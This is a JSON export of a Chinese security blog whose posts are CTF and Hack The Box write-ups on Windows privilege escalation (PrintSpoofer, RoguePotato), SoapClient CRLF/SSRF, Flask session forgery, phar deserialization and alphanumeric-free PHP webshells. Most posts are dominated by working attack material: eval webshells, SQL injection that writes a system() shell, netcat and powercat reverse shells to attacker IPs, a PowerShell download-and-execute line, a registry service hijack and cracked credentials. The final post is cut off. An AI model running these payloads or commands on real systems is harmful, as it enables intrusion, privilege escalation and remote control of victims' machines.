{"meta":{"title":"欢迎来访哦!","subtitle":null,"description":"学无止境啊!学吧,太深了!","author":"1eng","url":"http://perthinking.xyz","root":"/"},"posts":[{"tags":[],"title":"Windows-PrintSpoofer提权","date":"2020/05/14","text":"1.搭建一个iis服务器 写上一句话 &lt;%eval request(“a”)%&gt; 蚁剑连接 提权前提 需要有SeImpersonatePrivileg这个权限 然后编译exp 编译完成后中上传到靶机中 并执行 可能出现以下问题 vcruntime140d.dll丢失 然后修改为选项就可以了 经过多次编译 发现目标机无法执行成功exp 发现版本有限制… From LOCAL/NETWORK SERVICE to SYSTEM by abusing SeImpersonatePrivilege on Windows 10 and Server 2016/2019 放在win10上就成功了 aspx一句话:&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“a”],”unsafe”);%&gt; 拓展下 反弹shell PrintSpoofer.exe -c “C:\\inetpub\\wwwroot\\nc.exe 192.168.0.104 8888 -e cmd” 生成系统进程 Spawn a SYSTEM process on a desktop PrintSpoofer.exe -d 3 -c “powershell -ep bypass”","permalink":"http://perthinking.xyz/Elevation/2/","photos":[]},{"tags":[],"title":"Windows-RoguePotato  提权","date":"2020/05/14","text":"复现下国外大佬的提权 1.原理https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/amp/?__twitter_impression=true&amp;tdsourcetag=s_pctim_aiomsg 项目源码:https://github.com/antonioCoco/RoguePotato 2.复现靶机: win10 ip:192.168.0.102 攻击机: kali ip:192.168.0.101 首先 下载源码后编译 注意是 release 编译 编译后如下: 然后将编译后的软件上传到靶机中 我是将整个文件夹上传上去 看用法说明 应该要用到 RogueOxidResolver.exe 在win10开启一个iis 并上传一个执行命令的小马 在github上可以下载 访问后执行命令确保小马有用 然后在靶机上上传nc 并开启RPC服务 默认是开启的 在攻击机上执行命令: socat tcp-listen:135,reuseaddr,fork tcp:192.168.0.102:9999 Nc -lvp 4444 网站shell中执行 .\\RoguePotato.exe -r 192.168.0.101 -e “E:\\Debug\\nc64.exe 192.168.0.101 4444 -e cmd.exe” -l 9999 成功反弹shell 并获得系统权限 成功提权 然后也可以看到4444端口连接 还要说明的就是用户权限不能反弹shell","permalink":"http://perthinking.xyz/Elevation/1/","photos":[]},{"tags":[],"title":"Soapclient+crlf+ssrf(原理)","date":"2020/05/06","text":"1.基础知识 引用下优秀博客的文章 https://www.cnblogs.com/JeffreySun/archive/2009/12/14/1623766.html 然后再多接触下wsdl文档实例 2.CRLF 引用下优秀博客的文章 https://wooyun.js.org/drops/CRLF%20Injection漏洞的利用与实例分析.html 3.crlf+ssrf漏洞利用看soapclient方法 生成任意报文的POC &lt;?php $target = &#39;http://xxx/bbb.php&#39;; $post_string = &#39;a=b&amp;flag=aaa&#39;; $headers = array( &#39;X-Forwarded-For: 127.0.0.1&#39;, &#39;Cookie: xxxx=1234&#39; ); $b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39; =&gt; &quot;aaab&quot;)); $aaa = serialize($b); $aaa = str_replace(&#39;^^&#39;,&#39;%0d%0a&#39;,$aaa); $aaa = str_replace(&#39;&amp;&#39;,&#39;%26&#39;,$aaa); echo $aaa; ?&gt;4.简单运用soapclient1)本地测试&lt;?php $a = new SoapClient(null,array(&#39;uri&#39;=&gt;&#39;bbb&#39;, &#39;location&#39;=&gt;&#39;http://127.0.0.1:5555/path&#39;)); $b = serialize($a); echo $b; $c = unserialize($b); $c-&gt;not_exists_function(); 2)看看crlf漏洞&lt;?php $a = new SoapClient(null,array(&#39;uri&#39;=&gt;&quot;bbb\\r\\n\\r\\nccc\\r\\n&quot;, &#39;location&#39;=&gt;&#39;http://127.0.0.1:5555/path&#39;)); $b = serialize($a); echo $b; $c = unserialize($b); $c-&gt;not_exists_function(); 弹到vps试下 3)构造请求&lt;?php $target = &#39;http://39.101.184.64:5555/path&#39;; $post_string = &#39;data=something&#39;; $headers = array( &#39;X-Forwarded-For: 127.0.0.1&#39;, &#39;Cookie: PHPSESSID=my_session&#39; ); $b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content- Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39; =&gt; &quot;aaab&quot;)); $aaa = serialize($b); $aaa = str_replace(&#39;^^&#39;,&quot;\\r\\n&quot;,$aaa); $aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa); echo $aaa; $c = unserialize($aaa); $c-&gt;not_exists_function(); ?&gt;","permalink":"http://perthinking.xyz/CTF/6/","photos":[]},{"tags":[],"title":"Flask-session伪造-[CISCN2019 华东南赛区]Web4","date":"2020/05/06","text":"知识点: Flask模块 任意文件读取 伪随机数攻击 1.首先应想到它是flask模块写的py程序 修改为app.py拿到源码 # encoding:utf-8 import re, random, uuid, urllib from flask import Flask, session, request app = Flask(__name__) random.seed(uuid.getnode())//mac地址 app.config[&#39;SECRET_KEY&#39;] = str(random.random()*233) app.debug = True @app.route(&#39;/&#39;) def index(): session[&#39;username&#39;] = &#39;www-data&#39; return &#39;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#39; @app.route(&#39;/read&#39;) def read(): try: ​ url = request.args.get(&#39;url&#39;) ​ m = re.findall(&#39;^file.*&#39;, url, re.IGNORECASE) ​ n = re.findall(&#39;flag&#39;, url, re.IGNORECASE) ​ if m or n: ​ return &#39;No Hack&#39; ​ res = urllib.urlopen(url) ​ return res.read() except Exception as ex: ​ print str(ex) return &#39;no response&#39; @app.route(&#39;/flag&#39;) def flag(): if session and session[&#39;username&#39;] == &#39;fuck&#39;: ​ return open(&#39;/flag.txt&#39;).read() else: ​ return &#39;Access denied&#39; if __name__==&#39;__main__&#39;: app.run( ​ debug=True, ​ host=&quot;0.0.0.0&quot; )这里的考点就是利用伪随机数的攻击 替换cookie拿flag random.seed(uuid.getnode()) 设置随机种子为MAC地址 读取MAC地址 02:42:ae:01:22:f5 2.FlaskSession伪造 使用这个命令安装: pip install flask_session_cookie_manager 脚本: #!/usr/bin/env python2 \\# encoding:utf-8 import random import flask_session_cookie_manager2 mac = &quot;02:42:ae:01:22:f5&quot; random.seed(int(mac.replace(&quot;:&quot;, &quot;&quot;), 16)) for x in range(1000): SECRET_KEY = str(random.random() * 233) rs = flask_session_cookie_manager2.FSCM.decode(&#39;eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.XnS_Kw.ZdBc_Fi1QVVs6xXweABU0xuzfm8&#39;, SECRET_KEY) if &#39;error&#39; not in rs: ​ print(SECRET_KEY) ​ rs[u&#39;username&#39;] = &#39;fuck&#39; ​ print(str(rs)) ​ print(flask_session_cookie_manager2.FSCM.encode(SECRET_KEY, str(rs))) ​ break 得到cookie 访问flag 重置cookie即可拿到flag","permalink":"http://perthinking.xyz/CTF/5/","photos":[]},{"tags":[],"title":"Bypass disfuction-攻防世界smarty","date":"2020/05/05","text":"1.if标签首先 if标签得到phpinfo {if phpinfo()}{/if} 拿到路径 上传一句话 {file_put_contents(‘/var/www/html/shell.php’,’&lt;?php eval($_POST[1]);’)} 发现路径open_basedir()限制 也禁用了大部分函数 2.bypass disfuction然后就是bypass disfuction 也是linux pre_load 原理待补 https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD 上传这两个文件 访问http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so","permalink":"http://perthinking.xyz/CTF/4/","photos":[]},{"tags":[],"title":"phar反序列化(原理)","date":"2020/05/05","text":"1.phar文件结构: metadata: 2.生成phar文件&lt;?php class TestObject { } @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $o = new TestObject(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); ?&gt; 可以看到metadata序列化形式存储在phar.phar中 了解下phar伪协议 测试: class TestObject { ​ public function __destruct() { ​ echo &#39;Destruct called&#39;; ​ } } $filename = &#39;phar://phar.phar&#39;; file_get_contents($filename); 说明file_get_contents()解析phar文件时触发反序列化 也可以这样用 原理: 3.伪造成其它格式文件 伪造成gif class TestObject { } @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头 $o = new TestObject(); $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); 4.利用条件:","permalink":"http://perthinking.xyz/CTF/3/","photos":[]},{"tags":[],"title":"HTB靶机练习-Control","date":"2020/05/05","text":"先贴下要用到的命令 这样更快理清知识点 1&#39;;show global variables like &#39;%genera%&#39;;# 1&#39;;show global variables like &#39;secure_file_priv&#39;;# 1&#39;;select &quot;&lt;?php system($_GET[a]);?&gt;&quot; into OUTFILE &#39;C:\\\\Inetpub\\\\wwwroot\\\\a.php&#39;;# powershell -c &quot;IEX(New-Object System.Net.Webclient).DownloadString(&#39;http://10.10.16.26:8081/powercat.ps1&#39;);powercat -c 10.10.16.26 -p 8888 -e cmd&quot; sqlmap -r control.txt --passwords hashcat -m 300 pass.txt /usr/share/wordlists/rockyou.txt --force hashcat -m 300 pass.txt --show sqlmap -r control.txt --file-write=/home/aleng/Desktop/b.php --file-dest=c://inetpub/wwwroot/b.php curl http://10.10.16.26:8081/plink.exe -o ./uploads/plink.exe curl http://10.10.16.26:8081/nc3.exe -o ./uploads/nc.exe .\\plink.exe -R 5985:127.0.0.1:5985 10.10.16.26 .\\plink.exe -l aleng -pw aleng -R 5985:127.0.0.1:5985 10.10.16.26 gem install winrm-fs colorize stringio evil-winrm ruby evil-winrm.rb -i 127.0.0.1 -u hector -p l33th4x0rhector evil-winrm -i 127.0.0.1 -u Hector -p l33th4x0rhector get-acl HKLM:\\System\\CurrentControlSet\\services\\* | Format-List * | findstr /i &quot;Hector Users Path&quot; Get-ItemProperty HKLM:\\System\\CurrentControlSet\\services\\wuauserv reg add &quot;HKLM\\System\\CurrentControlSet\\services\\wuauserv&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;C:\\inetpub\\wwwroot\\uploads\\nc.exe 10.10.16.26 777 -e cmd&quot; /f start-Service wuauserv type C:\\Users\\Administrator\\Desktop\\root.txt1.nmap&amp;&amp;sql扫描结果如下 开启了80 135 msrpc 3306 mysql端口 访问80端口 四个页面 Admin login 页面提示 Index.php提示页面如下 联想到XXF 发现有注入 1’ 1’#发现不报错 放到sqlmap中跑 使用 –password跑密码 database management system users password hashes: [*] hector [1]: password hash: *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D [*] manager [1]: password hash: *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA clear-text password: l3tm3!n [*] root [1]: password hash: *0A4A5CAD344718DC418035A1F4D292BA603134D8 尝试写一句话 可是权限不够? 但也不是绝对的 可以写一句话试下 查询是否可写 因为是iis服务器 路径自然明了 成功写入一个shell 1&#39;;select &quot;&lt;?php system($_GET[a]);?&gt;&quot; into OUTFILE &#39;C:\\\\Inetpub\\\\wwwroot\\\\a.php&#39;;# 2.powercat 反弹shell在本地开一个python2 服务 然后监听端口 powershell -c &quot;IEX(New-Object System.Net.Webclient).DownloadString(&#39;http://10.10.16.26:8081/powercat.ps1&#39;);powercat -c 10.10.16.26 -p 8888 -e cmd&quot; 查看用户文件 我们的权限是 iis用户 查看下端口及服务 WinRM服务 WinRM全称是Windows Remote Management，是微软服务器硬件管理功能的一部分，能够对本地或远程的服务器进行管理。WinRM服务能够让管理员远程登录Windows操作系统，获得一个类似Telnet的交互式命令行shell，而底层通讯协议使用的是HTTP 接下来尝试上传putty简历管道连接 但是是失败的 https://www.nav1n.com/2019/12/hack-the-box-control-writeup-10-10-10-167/ 我就不尝试了 3.plink管道连接https://github.com/WhiteWinterWolf/wwwolf-php-webshell sqlmap -r control.txt –file-write=/home/aleng/Desktop/b.php –file-dest=c://inetpub/wwwroot/b.php 上传plink.exe建立管道连接 不要下错了版本 (都是坑阿…) 然后将靶机的5985端口转到本地5985 记住把本地的ssh端口服务开启 .\\plink.exe -R 5985:127.0.0.1:5985 10.10.16.26 切换到root 额 这一步是多余的… 4.hashcat爆破密码之前发现slqmap跑出了一个用户的密文 [*] hector [1]: password hash: *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D 在shell中我们也看到了这个用户 下面使用hashcat尝试爆破 hashcat -m 300 pass.txt /usr/share/wordlists/rockyou.txt –force -m 300 指定密码类型 命令执行后 hashcat -m 300 pass.txt –show 得到明文 0e178792e8fc304a2e3133d535d38caf1da3cd9d:l33th4x0rhector 然后使用winrm远程管理工具 https://www.freebuf.com/sectool/210479.html 不过得先配置下环境 不然得踩坑 查看本地源 gem source -l gem添加源 gem sources –add https://gems.ruby-china.com 删除原来的源 gem source -r https://rubygems.org/ Gem install evil-winrm 连接 evil-winrm -i 127.0.0.1 -u hector -p l33th4x0rhector 拿到第一个flag 5.计划任务提权使用一些命令信息搜集 Whoami /priv Net localgroup Administrators Cmdkey list 列举凭据 然后了解下window ACL get-acl HKLM:\\System\\CurrentControlSet\\services\\* | Format-List * | findstr /i &quot;Hector Users Path&quot; 查询某个用户的ACL 相当于linux的可执行程序吧… 最后是提权的漏洞点 Wuauserv 服务 Get-ItemProperty HKLM:\\System\\CurrentControlSet\\services\\wuauserv 写入注册表 提权 类似于服务劫持或者说计划任务吧算是 reg add &quot;HKLM\\System\\CurrentControlSet\\services\\wuauserv&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;C:\\inetpub\\wwwroot\\uploads\\nc.exe 10.10.16.26 777 -e cmd&quot; /f 应该是有人上传了一个nc 或者自己上传一个 然后本地监听 但是只有一次执行命令的机会… 反弹shell后直接报错 反正就还有好多坑 等踩吧…","permalink":"http://perthinking.xyz/HTB%E9%9D%B6%E6%9C%BA/1/","photos":[]},{"tags":[],"title":"代码审计+无数字字母webshell+windowsFindFirstfile利用+xctf-finals Web-lfi2019","date":"2020/05/05","text":"1.审计源码意思就是让上传个马,然后包含过去读flag 要把一些无关紧要的代码略过 1)实现put,get功能的代码:$parsed_url = explode(&quot;&amp;&quot;, $_SERVER[&#39;QUERY_STRING&#39;]); if(count($parsed_url) &gt;= 2){ ​ header(&quot;Content-Type:text/json&quot;); ​ switch($parsed_url[0]){ ​ case &quot;get&quot;: ​ $get = new Get($parsed_url[1]); ​ $data = $get-&gt;get(); ​ break; ​ case &quot;put&quot;: ​ $put = new Put($parsed_url[1], $_POST); ​ $data = $put-&gt;put(); ​ break; ​ default: ​ $data = [&quot;msg&quot; =&gt; &quot;Invalid data.&quot;]; ​ break; ​ } ​ die(json_encode($data)); }2)get功能块:class Get { ​ protected function nanahira(){ ​ // senpai notice me // ​ function exploit($data){ ​ $exploit = new System(); ​ } ​ $_GET[&#39;trigger&#39;] &amp;&amp; !@@@@@@@@@@@@@exploit($$$$$$_GET[&#39;leak&#39;][&#39;leak&#39;]); ​ } ​ private $filename; ​ function __construct($filename){ ​ $this-&gt;filename = path_sanitizer($filename); ​ } ​ function get(){ ​ if($this-&gt;filename === false){ ​ return [&quot;msg&quot; =&gt; &quot;blocked by path sanitizer&quot;, &quot;type&quot; =&gt; &quot;error&quot;]; ​ } ​ // wtf???? // ​ if(!@file_exists($this-&gt;filename)){ ​ // index files are *completely* disabled. // ​ if(stripos($this-&gt;filename, &quot;index&quot;) !== false){ ​ return [&quot;msg&quot; =&gt; &quot;you cannot include index files!&quot;, &quot;type&quot; =&gt; &quot;error&quot;]; ​ } ​ // hardened sanitizer spawned. thus we sense ambiguity // ​ $read_file = &quot;./files/&quot; . $this-&gt;filename; ​ $read_file_with_hardened_filter = &quot;./files/&quot; . path_sanitizer($this-&gt;filename, true); ​ if($read_file === $read_file_with_hardened_filter || ​ @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){ ​ return [&quot;msg&quot; =&gt; &quot;request blocked&quot;, &quot;type&quot; =&gt; &quot;error&quot;]; ​ } ​ // .. and finally, include *un*exploitable file is included. // ​ @include(&quot;./files/&quot; . $this-&gt;filename); ​ return [&quot;type&quot; =&gt; &quot;success&quot;]; ​ }else{ ​ return [&quot;msg&quot; =&gt; &quot;invalid filename (wtf)&quot;, &quot;type&quot; =&gt; &quot;error&quot;]; ​ } ​ } }3)put功能块class Put { ​ protected function nanahira(){ ​ // senpai notice me // ​ function exploit($data){ ​ $exploit = new System(); ​ } ​ $_GET[&#39;trigger&#39;] &amp;&amp; !@@@@@@@@@@@@@exploit($$$$$$_GET[&#39;leak&#39;][&#39;leak&#39;]); ​ } ​ private $filename; ​ private $content; ​ private $dir = &quot;./files/&quot;; ​ function __construct($filename, $data){ ​ global $seed; ​ if((string)$filename === (string)@path_sanitizer($data[&#39;filename&#39;])){ ​ $this-&gt;filename = (string)$filename; ​ }else{ ​ $this-&gt;filename = false; ​ } ​ $this-&gt;content = (string)@code_sanitizer($data[&#39;content&#39;]); ​ } ​ function put(){ ​ // just another typical file insertion // ​ if($this-&gt;filename === false){ ​ return [&quot;msg&quot; =&gt; &quot;blocked by path sanitizer&quot;, &quot;type&quot; =&gt; &quot;error&quot;]; ​ } ​ // check if file exists // ​ if(file_exists($this-&gt;dir . $this-&gt;filename)){ ​ return [&quot;msg&quot; =&gt; &quot;file exists&quot;, &quot;type&quot; =&gt; &quot;error&quot;]; ​ } ​ file_put_contents($this-&gt;dir . $this-&gt;filename, $this-&gt;content); ​ // just check if file is written. hopefully. // ​ if(@file_get_contents($this-&gt;dir . $this-&gt;filename) == &quot;&quot;){ ​ return [&quot;msg&quot; =&gt; &quot;file not written.&quot;, &quot;type&quot; =&gt; &quot;error&quot;]; ​ } ​ return [&quot;type&quot; =&gt; &quot;success&quot;]; ​ } }4)过滤函数: function rrmdir($dir, $depth=0){ ​ if (is_dir($dir)){ ​ $objects = scandir($dir); ​ foreach ($objects as $object){ ​ if ($object != &quot;.&quot; &amp;&amp; $object != &quot;..&quot;){ ​ if(is_dir($dir.&quot;/&quot;.$object)) ​ rrmdir($dir.&quot;/&quot;.$object, $depth + 1); ​ else ​ unlink($dir.&quot;/&quot;.$object); ​ } ​ } ​ } ​ if($depth != 0) rmdir($dir); } function countdir($dir){ ​ if (is_dir($dir)){ ​ $objects = scandir($dir); ​ foreach ($objects as $object){ ​ if ($object != &quot;.&quot; &amp;&amp; $object != &quot;..&quot;){ ​ $count += 1; ​ if(is_dir($dir.&quot;/&quot;.$object)) ​ $count += countdir($dir.&quot;/&quot;.$object); ​ } ​ } ​ } ​ return $count; } var_dump(countdir(&quot;./files&quot;)); if(countdir(&quot;./files/&quot;) &gt;= 100) @rrmdir(&quot;./files/&quot;); // Here, kawaii path-san for you! // function path_sanitizer($dir, $harden=false){ ​ $dir = (string)$dir; ​ $dir_len = strlen($dir); ​ // Deny LFI/RFI/XSS // ​ $filter = [&#39;.&#39;, &#39;./&#39;, &#39;~&#39;, &#39;.\\\\&#39;, &#39;#&#39;, &#39;&lt;&#39;, &#39;&gt;&#39;]; ​ foreach($filter as $f){ ​ if(stripos($dir, $f) !== false){ ​ return false; ​ } ​ } ​ // Deny SSRF and all possible weird bypasses // ​ $stream = stream_get_wrappers(); ​ $stream = array_merge($stream, stream_get_transports()); ​ $stream = array_merge($stream, stream_get_filters()); ​ foreach($stream as $f){ ​ $f_len = strlen($f); ​ if(substr($dir, 0, $f_len) === $f){ ​ return false; ​ } ​ } ​ // Deny length // ​ if($dir_len &gt;= 128){ ​ return false; ​ } ​ // Easy level hardening // ​ if($harden){ ​ $harden_filter = [&quot;/&quot;, &quot;\\\\&quot;]; ​ foreach($harden_filter as $f){ ​ $dir = str_replace($f, &quot;&quot;, $dir); ​ } ​ } ​ // Sanitize feature is available starting from the medium level // ​ return $dir; } // The new kakkoii code-san is re-implemented. // function code_sanitizer($code){ ​ // Computer-chan, please don&#39;t speak english. Speak something else! // ​ $code = preg_replace(&quot;/[^&lt;&gt;!@#$%\\^&amp;*\\_?+\\.\\-\\\\\\&#39;\\&quot;\\=\\(\\)\\[\\]\\;]/u&quot;, &quot;*Nope*&quot;, (string)$code); ​ return $code; }5)还有这段代码:@require(&#39;flag.php&#39;); $seed = md5(rand(PHP_INT_MIN,PHP_INT_MAX)); if($flag === $_GET[&#39;trigger&#39;]){ ​ die(hash(&quot;sha256&quot;, $seed . $flag)); } class System { ​ function __destruct(){ ​ global $seed; ​ // ain&#39;t Argon2, ain&#39;t pbkdf2. what could go wrong? ​ $flag = hash(&#39;sha256&#39;, $seed); ​ if($_GET[$flag]){ ​ @system($_GET[$flag]); ​ }else{ ​ @unserialize($_SESSION[$flag]); ​ } ​ } }这里是迷惑点,拿不到flag 2.分析put要过滤的点首先这个条件成立才能put文件 if((string)$filename === (string)@path_sanitizer($data[&#39;filename&#39;])) 文件名不能包含这些符号 $filter = [&#39;.&#39;, &#39;./&#39;, &#39;~&#39;, &#39;.\\\\&#39;, &#39;#&#39;, &#39;&lt;&#39;, &#39;&gt;&#39;]; ​ foreach($filter as $f){ ​ if(stripos($dir, $f) !== false){ ​ return false; ​ } ​ }长度限制: if($dir_len &gt;= 128){ ​ return false; ​ }content的限制: $code = preg_replace(&quot;/[^&lt;&gt;!@#$%\\^&amp;*\\_?+\\.\\-\\\\\\&#39;\\&quot;\\=\\(\\)\\[\\]\\;]/u&quot;, &quot;*Nope*&quot;, (string)$code); 本地测试下: $a=@$_POST[a]; //$a = preg_replace(&quot;/[^&lt;&gt;!@#$%\\^&amp;*\\_?]/u&quot;, &quot;h&quot;, $a); $a = preg_replace(&quot;/[^&lt;&gt;!@#$%\\^&amp;*\\_?+\\.\\-\\\\\\&#39;\\&quot;\\=\\(\\)\\[\\]\\;]/u&quot;, &quot;h&quot;, $a); echo $a; 多了四个 hhhh 输入的字符没有被替换 怎么多了四个hhhh? 发现 应该是这样的,它会默认匹配 /r /n 属于一个字节,而汉字匹配的话是两个字节 所以这样的话就是四个字节了 替换后就变成了四个hhhh 再输入一个回车试下: 假如一句话是 虽然添加了几个字符 但并不影响php代码的执行 总结来说 就是让上传一个没有字母和数字的webshell 3.分析get要过滤的点1)这个函数解析url中get参数 explode(“&amp;”, $_SERVER[‘QUERY_STRING’]); 2)看过滤点: $read_file = &quot;./files/&quot; . $this-&gt;filename; ​ $read_file_with_hardened_filter = &quot;./files/&quot; . path_sanitizer($this-&gt;filename, true); ​ if($read_file === $read_file_with_hardened_filter || ​ @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){ ​ return [&quot;msg&quot; =&gt; &quot;request blocked&quot;, &quot;type&quot; =&gt; &quot;error&quot;]; ​ }首先看这个函数 path_sanitizer($this-&gt;filename, true) --&gt; if($harden){ ​ $harden_filter = [&quot;/&quot;, &quot;\\\\&quot;]; ​ foreach($harden_filter as $f){ ​ $dir = str_replace($f, &quot;&quot;, $dir); ​ } ​ }它将文件名中 / \\替换为空 然后这个if判断为真的话不能包含文件 if($read_file === $read_file_with_hardened_filter || ​ @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)) 也就是说包含的文件名必须加 / 或 \\ 同时文件内容也是不一样的 比如上传一个test 然后包含文件时是test\\ -&gt; test不等于test\\ 并且 file_get_contents(‘test&#39;)不等于file_get_contents(‘test’) 那么这个判断就可以绕过了 现在测试一下 再包含下 可以发现 成功include 但是文件内容没有读取 @include(&quot;./files/&quot; . $this-&gt;filename); -&gt; ./files/test\\ 它包含的是这个文件 而我们上传的文件是这样的: ./files/test 所以文件并不能读取 4.windows FindFirstFile利用&lt;?php for ($j=0; $j&lt;256; $j++) { ​ for ($i=0; $i&lt;256; $i++) { ​ $url = &#39;flag.p&#39; . chr($j) . chr($i); ​ $tmp = @file_get_contents($url); ​ if (!empty($tmp)) echo chr($j) . chr($i) . &quot; &quot;; ​ } } ?&gt; 本地测试 本题环境是 windows 所以我们可以上传 文件名为 “/test 绕过: $read_file = &quot;./files/&quot; . $this-&gt;filename; // ./files/./test $read_file_with_hardened_filter = &quot;./files/&quot; . path_sanitizer($this-&gt;filename, true); // ./files/.test @file_get_contents($read_file) //实际获取内容 @file_get_contents($read_file_with_hardened_filter) // 文件不存在 5.最后就是构造无数字字母的webshell 看P牛文章:https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html 在构造前先理解下自增运算符拿shell的原理 &lt;?php $_=[]; $_=@&quot;$_&quot;; // $_=&#39;Array&#39;; $_=$_[&#39;!&#39;==&#39;@&#39;]; // $_=$_[0]; $___=$_; // A $__=$_; //$__=A $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //$__=&#39;S&#39; $___.=$__; // $___=&#39;AS&#39; $___.=$__; // $___=&#39;ASS&#39; $__=$_; // $__=&#39;A&#39; $__++;$__++;$__++;$__++; // $__=&#39;E&#39; $___.=$__; //$___=&#39;ASSE&#39; $__=$_; //$__=&#39;A&#39; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__=&#39;R&#39; $___.=$__; //$___=&#39;ASSER&#39; $__=$_; //$__=&#39;A&#39; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__=&#39;T&#39; $___.=$__; //$___=&#39;ASSERT&#39; $____=&#39;_&#39;; //$____=&#39;_&#39; $__=$_; //$__=&#39;A&#39; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__=&#39;P&#39; $____.=$__; //$____=&#39;_P&#39; $__=$_; //$__=&#39;A&#39; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__=&#39;O&#39; $____.=$__; //$____=&#39;_PO&#39; $__=$_; //$__=&#39;A&#39; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__=&#39;S&#39; $____.=$__; //$____=&#39;_POS&#39; $__=$_; //$__=&#39;A&#39; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__=&#39;T&#39; $____.=$__; ////$____=&#39;_POST&#39; $_=$$____; //$_=&#39;$_POST&#39; $___($_[_]); // ASSERT($_POST[_]); ?&gt;再构造readfile(‘flag.php’) &lt;?=$_=[];$_=&quot;$_&quot;;$_=$_[(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quot;)];$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$_;$___++;$___++;$___++;$___++;$____=$_;$_____=$_;$_____++;$_____++;$_____++;$______=$_;$______++;$______++;$______++;$______++;$______++;$__=$__.$___.$____.$_____.$______;$___=$_;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$_____++;$_____++;$_____++;$_____++;$__=$__.$___.$____.$_____;$___=$_;$___++;$___++;$___++;$___++;$___++;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$______=$_;$______++;$______++;$______++;$______++;$______++;$______++;$___=$___.$____.$_____.$______;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;$___=$___.&#39;.&#39;.$____.$_____.$____;$__($___);?&gt;然后记得url编码过去 + 在匹配中会认为是空格 然后包含 再补充下为什么文件后缀不是 php 可以执行 php代码 只要文件内容是php完整代码就能执行","permalink":"http://perthinking.xyz/CTF/2/","photos":[]},{"tags":[],"title":"哈希长度扩展攻击","date":"2020/04/19","text":"攻击的常见来源:大多数网站有下载文件的选项,它会判断你是否具有权限下载这个文件,就会对你想要下载的任意文件名进行类似于MD5,Sha等算法的hash,例如你想要下载hash=test.pdf%00../../../etc/password它就可能执行判断语句:if ($sig === md5($salt.$name))但是这样的话就有可能被绕过的风险 MD5算法解析:Md5的典型应用是对一段字符串产生指纹,防止被篡改.就相当于每个人都有自己独立的指纹(在算法里面是可以绕过的)MD5以多个512位(64个字节)分组来处理文本,每组16个32位(4个字节)子分组.算法输出由32位分组组成.当每一个块(512位分组)计算完成后,四个寄存器的值就被更新,如果还存在下一个块,就会在被更新的寄存器上继续计算,直到所有块被计算完毕,四个寄存器的十六进制值连接起来就是MD5当被hash的字符串长度不足512bit时,就得部位 